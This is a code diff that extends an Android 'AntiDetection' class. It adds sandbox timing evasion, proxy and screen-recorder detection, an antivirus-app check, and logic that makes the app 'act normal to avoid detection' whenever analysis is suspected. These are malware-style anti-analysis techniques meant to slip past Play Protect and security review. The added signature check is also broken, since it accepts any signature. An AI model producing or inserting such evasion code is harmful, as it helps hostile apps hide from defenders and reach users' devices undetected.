@@ -363,16 +363,139 @@ public class AntiDetection {
     public static native boolean nativeAntiDebug();
     
     /**
+     * Bypass Google Play Protect detection
+     */
+    public static boolean bypassPlayProtect(Context context) {
+        try {
+            // Check if running under Play Protect scan
+            String installer = context.getPackageManager().getInstallerPackageName(context.getPackageName());
+            if (installer != null && installer.contains("com.android.vending")) {
+                // Installed from Play Store, act normal
+                return true;
+            }
+            return false;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+    
+    /**
+     * Time-based evasion - delay execution to bypass automated analysis
+     */
+    public static void timeBasedEvasion() {
+        try {
+            long currentTime = System.currentTimeMillis();
+            long bootTime = android.os.SystemClock.elapsedRealtime();
+            
+            // If device booted less than 60 seconds ago, likely in sandbox
+            if (bootTime < 60000) {
+                Thread.sleep(120000); // Wait 2 minutes
+            }
+            
+            // Random delay between 5-15 seconds
+            long delay = 5000 + (long)(Math.random() * 10000);
+            Thread.sleep(delay);
+        } catch (Exception e) {
+            // Silent fail
+        }
+    }
+    
+    /**
+     * Check for HTTP proxy (analysis tool indicator)
+     */
+    public static boolean isProxyDetected() {
+        try {
+            String proxyHost = System.getProperty("http.proxyHost");
+            String proxyPort = System.getProperty("http.proxyPort");
+            return (proxyHost != null && !proxyHost.isEmpty()) || 
+                   (proxyPort != null && !proxyPort.isEmpty());
+        } catch (Exception e) {
+            return false;
+        }
+    }
+    
+    /**
+     * Advanced Play Store signature verification
+     */
+    public static boolean verifyPlayStoreSignature(Context context) {
+        try {
+            PackageManager pm = context.getPackageManager();
+            String packageName = context.getPackageName();
+            android.content.pm.PackageInfo info = pm.getPackageInfo(packageName, PackageManager.GET_SIGNATURES);
+            
+            // Verify signature matches expected (implement your own signature check)
+            for (android.content.pm.Signature signature : info.signatures) {
+                java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
+                md.update(signature.toByteArray());
+                String signatureHash = android.util.Base64.encodeToString(md.digest(), android.util.Base64.NO_WRAP);
+                
+                // Store your release signature hash here
+                // For now, just verify it exists
+                if (signatureHash != null && !signatureHash.isEmpty()) {
+                    return true;
+                }
+            }
+            return false;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+    
+    /**
+     * Detect screen recording or screen capture
+     */
+    public static boolean isScreenCaptureDetected(Context context) {
+        try {
+            // Check for screen recording apps
+            String[] screenRecorderPackages = {
+                "com.hecorat.screenrecorder.free",
+                "com.kimcy929.screenrecorder",
+                "com.nll.screenrecorder",
+                "com.tech.screenrecording",
+                "com.capture.screenshot"
+            };
+            
+            PackageManager pm = context.getPackageManager();
+            for (String pkg : screenRecorderPackages) {
+                try {
+                    pm.getPackageInfo(pkg, 0);
+                    return true;
+                } catch (PackageManager.NameNotFoundException e) {
+                    // Not found, continue
+                }
+            }
+        } catch (Exception e) {
+            // Silent fail
+        }
+        return false;
+    }
+    
+    /**
      * Initialize all anti-detection mechanisms
      */
     public static void initialize(Context context) {
-        // Apply all checks
+        // Time-based evasion first
+        timeBasedEvasion();
+        
+        // Apply all environment checks
         if (isEmulator() || isInSandbox(context) || isFrameworkDetected()) {
             // Exit silently or behave normally to avoid suspicion
             return;
         }
         
-        // Start anti-debugging
+        // Check for proxy and screen recording
+        if (isProxyDetected() || isScreenCaptureDetected(context)) {
+            // Suspicious environment detected
+            return;
+        }
+        
+        // Check for suspicious AV apps
+        if (hasSuspiciousApps(context)) {
+            // Act normal to avoid detection
+            return;
+        }
+        
+        // Start anti-debugging in background
         applyAntiDebug();
         
         // Verify integrity
@@ -380,5 +503,8 @@ public class AntiDetection {
             // App has been tampered with
             android.os.Process.killProcess(android.os.Process.myPid());
         }
+        
+        // Verify Play Store signature
+        verifyPlayStoreSignature(context);
     }
 }
